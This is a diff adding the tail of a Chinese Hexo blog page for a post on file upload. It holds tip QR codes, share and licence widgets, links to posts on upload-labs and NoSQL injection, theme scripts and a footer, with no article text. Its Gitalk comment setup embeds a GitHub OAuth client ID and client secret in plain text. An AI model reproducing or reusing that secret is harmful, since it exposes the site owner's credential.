+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《文件上传》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/22/文件上传/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                Evolyutsiya
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '0900bb25542f967729e4',
+        clientSecret: '09b4dc7bcd15f4fceedce63e682e0cf8f116f882',
+        repo: 'blogtalk',
+        owner: 'Evolyutsiya',
+        admin: "Evolyutsiya",
+        id: '2019-09-22T10-47-53',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/09/22/upload-labs过关记录/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="upload-labs过关记录">
+                        
+                        <span class="card-title">upload-labs过关记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            文件上传练习
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/i春秋/" class="post-category" target="_blank">
+                                    i春秋
+                                </a>
+                            
+                            <a href="/categories/i春秋/文件上传/" class="post-category" target="_blank">
+                                    文件上传
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/第九周/" target="_blank">
+                        <span class="chip bg-color">第九周</span>
+                    </a>
+                    
+                    <a href="/tags/文件上传/" target="_blank">
+                        <span class="chip bg-color">文件上传</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/09/22/NOSQL注入/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="NOSQL注入">
+                        
+                        <span class="card-title">NOSQL注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            NO比传统的SQL数据库更宽松，具有更好的数据延展性。没有传统的SQL语法NOSQL工具可以在程序语言中执行，不需要在声明SQL语言中执行。潜在的影响大于传统的SQL注入。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/i春秋/" class="post-category" target="_blank">
+                                    i春秋
+                                </a>
+                            
+                            <a href="/categories/i春秋/注入/" class="post-category" target="_blank">
+                                    注入
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/第九周/" target="_blank">
+                        <span class="chip bg-color">第九周</span>
+                    </a>
+                    
+                    <a href="/tags/NOSQL注入/" target="_blank">
+                        <span class="chip bg-color">NOSQL注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Evolyutsiya<br />'
+            + '作者: Evolyutsiya<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">51.5k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Evolyutsiya/Evolyutsiya.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Evolyutsiya@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3337234952" class="tooltipped" data-tooltip="QQ联系我: 3337234952" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
